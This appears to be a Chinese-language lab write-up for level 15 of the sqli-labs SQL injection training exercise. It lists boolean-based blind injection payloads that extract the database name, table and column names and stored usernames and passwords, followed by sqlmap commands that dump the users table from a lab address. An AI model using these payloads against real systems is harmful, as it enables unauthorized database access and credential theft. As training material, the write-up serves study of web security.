---
title: less15
url: https://www.yuque.com/u29002979/ep2zrx/rf1nzelfaag76oai
---

```bash
@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
```

用单引号'闭合
`1'`显示红色的图片
`admin' order by 2-- +`显示蓝色图片

`admin' union select 1,2-- +`蓝色图片

正确的数据与错误数据页面回显的图片不一样，使用**布尔盲注**\ <a name="K8btv"></a>

# 布尔盲注

```bash
判断数据库名称长度
admin' or length(database())=8--+
显示蓝色图片，说明数据库长度为8

逐一猜解数据库名称
admin' or ascii(substr(database(),1,1))=115--+
第一个字符是s  ...

猜解数据表名称
admin' or ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>101 --+
第一个字符是e ...

猜解字段名称
admin' or ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))=105--+
第一个字符是i ...

猜解字段内容
admin' or ascii(mid((select group_concat(username,0x7e,password) from users),1,1))=68--+
第一个字符是D ...
```

<a name="ytLRo"></a>

# sqlmap

```bash
探测注入点
sqlmap -u http://192.168.31.193/Less-15/ --data="uname=admin&passwd=admin" --batch
爆破数据库名
sqlmap -u http://192.168.31.193/Less-15/ --data="uname=admin&passwd=admin" --batch --current-db
爆破数据表
sqlmap -u http://192.168.31.193/Less-15/ --data="uname=admin&passwd=admin" --batch -D security --tables 
最后脱库
sqlmap -u http://192.168.31.193/Less-15/ --data="uname=admin&passwd=admin" --batch -D security -T users --dump

```
